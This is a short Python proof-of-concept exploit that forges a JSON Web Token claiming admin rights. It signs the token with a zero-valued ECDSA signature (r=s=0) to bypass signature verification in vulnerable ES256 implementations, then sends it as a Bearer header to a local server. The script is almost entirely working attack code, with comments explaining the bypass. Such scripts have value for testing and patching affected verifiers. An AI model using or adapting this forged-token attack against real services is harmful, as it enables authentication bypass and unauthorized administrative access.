#!/usr/bin/env python3
# Most simple template made for generate token with null signature

__author__ = 'nighter@nighter.se'

import datetime
import requests
import os
import base64

from base64 import b64encode
from os import urandom

def get_token():
    
    # Format for JWT is ALG.PAYLOAD.SIGNATURE     
    header = '{"typ":"JWT","alg":"ES256"}'.encode('ascii')
    body   = '{"sub": "Admin","admin": true,"iat": 1650466502,"exp": 1900470102}'.encode('ascii')
    
    # However, specifying an ECDSA signature with r=s=0 encoded in DER, MAYCAQACAQA=, allows us to bypass the JWT verification check!
    # $ echo -ne "MAYCAQACAQA=" | base64 -d | openssl asn1parse -inform der
    # 0:d=0  hl=2 l=   6 cons: SEQUENCE
    # 2:d=1  hl=2 l=   1 prim: INTEGER           :00
    # 5:d=1  hl=2 l=   1 prim: INTEGER           :00
    signature = 'MAYCAQACAQA'.encode('ascii')
        
    payload = "%s.%s.%s" % (base64.b64encode(header).decode('utf-8'), base64.b64encode(body).decode('utf-8'),signature.decode('utf-8'))
    return payload


def send_request():
    
    global TOKEN
    headers = {"Authorization": "Bearer %s" % TOKEN}
    r = requests.get('http://localhost:8080/', headers=headers, verify=False)
    print('\n%s\n' % r.text)
    
if __name__ == '__main__':

    TOKEN = get_token()
    print("Authorization: Bearer %s" % TOKEN)
    send_request()